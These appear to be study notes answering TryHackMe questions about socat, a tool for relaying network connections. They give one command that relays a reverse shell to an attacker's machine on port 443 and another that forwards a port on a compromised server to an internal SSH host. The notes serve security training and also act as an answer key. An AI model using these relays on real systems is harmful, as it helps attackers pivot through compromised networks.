- [x] Task 13: [[SoCat]]
Which socat option allows you to reuse the same listening port for more than one connection?
	reuseaddr
If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?

Use TCP port 8000 for the server listener, and **do not** background the process.
	./socat tcp-l:8000 tcp:172.16.0.200:443
What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?
	./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &
**Bonus Question (Optional):** Try to create an encrypted port forward or relay using the `OPENSSL` options in socat. Task 7 of the [shells](https://tryhackme.com/room/introtoshells) room may help with this.
